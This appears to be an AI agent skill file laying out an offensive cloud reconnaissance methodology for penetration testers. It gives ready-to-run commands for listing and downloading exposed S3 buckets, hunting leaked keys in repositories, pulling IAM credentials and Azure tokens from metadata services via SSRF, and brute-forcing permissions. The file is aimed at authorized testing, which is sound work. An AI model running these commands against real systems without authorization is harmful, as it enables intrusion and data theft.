---
name: cloud-recon
description: "Offensive cloud reconnaissance skill for penetration testers. Generates structured external recon plans and commands for discovering cloud attack surfaces across AWS and Azure. Use this skill whenever the user mentions cloud recon, cloud reconnaissance, cloud asset discovery, cloud pentest recon, finding S3 buckets, finding Azure blob storage, subdomain enumeration for cloud targets, credential hunting in repositories, external cloud footprint mapping, or any task related to the discovery phase of a cloud penetration test. Also trigger when the user says things like 'I need to recon this target', 'map the cloud attack surface', 'find exposed cloud assets', 'hunt for leaked credentials', or 'start a cloud pentest engagement'. This skill covers black box (no prior knowledge) and gray box (limited credentials) recon scenarios."
---

# Cloud Recon Skill

An offensive reconnaissance skill for cloud penetration testing engagements. This skill helps pentesters systematically discover cloud attack surfaces, exposed assets, leaked credentials, and entry points across AWS and Azure environments.

## Core Principles

This is a pure offensive skill. It approaches reconnaissance from an attacker's perspective, not a compliance auditor's. The goal is to find ways in, not check boxes.

Every recon engagement is different. Adapt the plan based on what you find. Recon is iterative: each discovery feeds the next step.

## How to Use This Skill

When the user provides a target (company name, domain, or partial information), generate a structured recon plan tailored to their engagement type. Always ask:

1. What do you have? (company name only, domain, IP ranges, any credentials?)
2. Black box or gray box?
3. AWS, Azure, or unknown?

If the user doesn't specify, default to black box with unknown cloud provider.

## Recon Methodology

### Phase 1: Passive Reconnaissance (No Direct Target Interaction)

Start here always. Zero interaction with target infrastructure.

**Storage Bucket Discovery**

Cloud storage is the most common low-hanging fruit. Organizations follow naming patterns.

Given a company name or domain (e.g., "acmecorp" or "acmecorp.com"), generate wordlists:
- {company}-prod, {company}-dev, {company}-staging, {company}-backup, {company}-logs
- {company}-assets, {company}-data, {company}-internal, {company}-public
- {company}-{service} (e.g., acmecorp-api, acmecorp-frontend, acmecorp-db-backups)
- {env}-{company} (e.g., prod-acmecorp, dev-acmecorp)
- {company}.{env} patterns

AWS S3 commands:
```bash
# Check if bucket exists and is listable
aws s3 ls s3://{bucket-name} --no-sign-request

# Try to download contents
aws s3 sync s3://{bucket-name} ./loot/{bucket-name} --no-sign-request
```

Azure Blob Storage:
```bash
# Azure blob URL pattern
curl -s "https://{storageaccount}.blob.core.windows.net/{container}?restype=container&comp=list"

# Check common container names
for container in data backup logs assets files; do
  curl -s -o /dev/null -w "%{http_code}" "https://{storageaccount}.blob.core.windows.net/${container}?restype=container&comp=list"
done
```

Tools:
- S3Scanner: `s3scanner scan --bucket-file wordlist.txt`
- CloudBrute: `cloudbrute -d {domain} -k {keyword} -w wordlist.txt`
- GrayhatWarfare (web): search for company-related buckets

**DNS and Subdomain Enumeration**

Cloud services often hide behind subdomains that reveal infrastructure.

```bash
# Subdomain enumeration
subfinder -d {domain} -o subdomains.txt
amass enum -passive -d {domain} -o amass_results.txt

# Look for cloud-indicating subdomains
grep -iE "(aws|s3|ec2|lambda|azure|blob|cloudfront|elasticbeanstalk|azurewebsites)" subdomains.txt

# Certificate transparency logs
curl -s "https://crt.sh/?q=%.{domain}&output=json" | jq '.[].name_value' | sort -u
```

Patterns that indicate cloud infrastructure:
- *.s3.amazonaws.com or *.s3-{region}.amazonaws.com (AWS S3)
- *.cloudfront.net (AWS CloudFront)
- *.elasticbeanstalk.com (AWS Elastic Beanstalk)
- *.execute-api.{region}.amazonaws.com (AWS API Gateway)
- *.azurewebsites.net (Azure App Service)
- *.blob.core.windows.net (Azure Blob Storage)
- *.azureedge.net (Azure CDN)
- *.database.windows.net (Azure SQL)
- *.vault.azure.net (Azure Key Vault, if exposed)

**Credential Hunting in Public Repositories**

This is often the fastest path to initial access.

```bash
# truffleHog - scan for secrets in git repos
trufflehog github --org={company-github-org}
trufflehog git https://github.com/{company}/{repo}.git

# Search GitHub for exposed keys (manual or via API)
# Search terms:
#   "{company}" "AKIA" (AWS access key prefix)
#   "{company}" "aws_secret_access_key"
#   "{domain}" "password"
#   "{company}" ".env"
#   "{company}" "terraform.tfstate"
#   "{company}" "connectionstring" (Azure)
#   "{company}" "AccountKey=" (Azure Storage)

# git-secrets (scan cloned repos)
git secrets --scan -r /path/to/cloned/repo
```

Also check:
- Pastebin, GitHub Gists (search for domain/company name)
- Docker Hub (public images may contain embedded credentials)
- NPM packages (company published packages may leak configs)
- Archive.org Wayback Machine (old versions of sites may expose endpoints or keys)

**Cloud Provider Identification**

Determine which cloud provider(s) the target uses.

```bash
# DNS lookups reveal cloud providers
dig {domain} +short
dig CNAME {domain}

# Check common cloud IP ranges
nmap -sn {ip} --script ip-range-lookup

# HTTP headers often reveal cloud services
curl -sI https://{domain} | grep -iE "(x-amz|x-azure|server|x-ms|x-cloud)"

# Check MX records (may indicate M365/Azure)
dig MX {domain}

# Check SPF records (may list cloud services)
dig TXT {domain} | grep spf
```

### Phase 2: Active Reconnaissance (Direct Target Interaction)

Move here after passive recon. This generates logs on the target side.

**Port and Service Scanning**

```bash
# Nmap scan on discovered cloud IPs
nmap -sC -sV -oA cloud_scan {target-ips}

# Focus on cloud-relevant ports
nmap -p 80,443,8080,8443,3389,22,5985,5986,9443,6443 {target-ips}

# Check for Kubernetes API
curl -sk https://{ip}:6443/version
curl -sk https://{ip}:10250/pods
```

**API Endpoint Discovery**

```bash
# Check for exposed Swagger/OpenAPI docs
curl -s https://{domain}/swagger.json
curl -s https://{domain}/api/swagger.json
curl -s https://{domain}/v1/api-docs
curl -s https://{domain}/.well-known/openapi.json

# Check for exposed GraphQL
curl -s https://{domain}/graphql -d '{"query":"{__schema{types{name}}}"}'

# AWS API Gateway endpoints (if discovered via DNS)
curl -s https://{api-id}.execute-api.{region}.amazonaws.com/{stage}/
```

**Metadata Service Probing (if SSRF is found)**

If you discover an SSRF vulnerability in a cloud-hosted application:

AWS IMDS:
```bash
# IMDSv1 (if not enforced to v2)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/{role-name}

# IMDSv2 requires token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Azure IMDS:
```bash
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### Phase 3: Gray Box Enumeration (When You Have Credentials)

If you obtained credentials (from recon, given by client, or exploited), enumerate from the inside.

Read the cloud-specific reference files for detailed enumeration:
- For AWS: read `references/aws-recon.md`
- For Azure: read `references/azure-recon.md`

Quick start commands:

AWS (with access key):
```bash
# Who am I?
aws sts get-caller-identity

# What can I do?
# Use enumerate-iam to brute-force permissions
python3 enumerate-iam.py --access-key {AKIA...} --secret-key {secret}

# PACU session
pacu
> set_keys
> run iam__enum_permissions
> run iam__enum_users_roles_policies_groups
> run ec2__enum
> run s3__enum
> run lambda__enum
```

Azure (with credentials):
```bash
# Login
az login -u {user} -p {password}

# Who am I?
az account show
az ad signed-in-user show

# What can I see?
az resource list --output table
az role assignment list --all --output table
az storage account list --output table
```

## Output Format

Always structure recon output as:

```
## Recon Report: {target}
### Engagement Type: {black box / gray box}
### Cloud Provider(s): {AWS / Azure / Unknown}

### Findings

#### Exposed Storage
- [finding details, bucket/container name, what's accessible]

#### Subdomains and Services
- [discovered subdomains with cloud indicators]

#### Credential Leaks
- [any discovered credentials or secrets, redacted appropriately]

#### API Endpoints
- [discovered APIs, authentication status]

#### Cloud Infrastructure Map
- [identified services, regions, architecture patterns]

### Recommended Next Steps
- [prioritized list of what to exploit next, referencing cloud-exploit-mapper skill]
```

## Important Notes

- Always confirm you have written authorization before starting any recon
- Passive recon (Phase 1) generates no logs on the target. Active recon (Phase 2+) does.
- Document every command you run and its output for the final report
- If you find credentials during recon, do NOT use them until you've confirmed they're in scope
- Recon is iterative. Each finding should make you ask "what else can I find because of this?"
